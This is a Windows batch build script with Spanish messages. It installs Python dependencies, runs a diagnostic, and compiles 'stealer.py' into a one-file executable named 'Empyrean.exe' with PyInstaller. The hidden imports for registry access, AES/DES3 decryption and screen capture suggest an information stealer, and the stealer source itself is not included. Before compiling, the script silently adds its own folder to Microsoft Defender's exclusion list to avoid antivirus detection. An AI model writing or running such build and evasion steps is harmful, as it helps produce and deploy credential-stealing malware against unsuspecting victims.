@echo off
setlocal
cd /d "%~dp0"
echo === 1. Interprete compatible ===
set PY=
py -3.13 -c "import sys" >nul 2>&1 && set PY=py -3.13
if not defined PY py -3.12 -c "import sys" >nul 2>&1 && set PY=py -3.12
if not defined PY py -3.11 -c "import sys" >nul 2>&1 && set PY=py -3.11
if not defined PY echo [FALLO] instala Python 3.12 o 3.13 desde python.org & pause & exit /b 1
echo    usando: %PY%

echo === 2. Dependencias ===
%PY% -m pip install --upgrade --quiet pip
%PY% -m pip install --upgrade --quiet pycryptodome pillow requests pyinstaller
if errorlevel 1 echo [FALLO] pip fallo & pause & exit /b 1

echo === 3. Diagnostico ===
%PY% diagnostico.py
if errorlevel 1 echo [FALLO] diagnostico con fallos, no compilo & pause & exit /b 1

echo === 4. Exclusion de Defender ===
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%CD%' -ErrorAction SilentlyContinue" >nul 2>&1

echo === 5. Compilando ===
%PY% -m PyInstaller --noconfirm --onefile --noupx --clean --name Empyrean ^
  --hidden-import winreg ^
  --hidden-import Crypto.Cipher.AES ^
  --hidden-import Crypto.Cipher.DES3 ^
  --hidden-import Crypto.Util.Padding ^
  --hidden-import PIL.ImageGrab ^
  --hidden-import PIL.Image ^
  stealer.py
if errorlevel 1 echo [FALLO] PyInstaller fallo & pause & exit /b 1

if not exist "dist\Empyrean.exe" echo [FALLO] no se genero el exe & pause & exit /b 1
echo.
echo === LISTO: dist\Empyrean.exe ===
for %%F in ("dist\Empyrean.exe") do echo tamano: %%~zF bytes
pause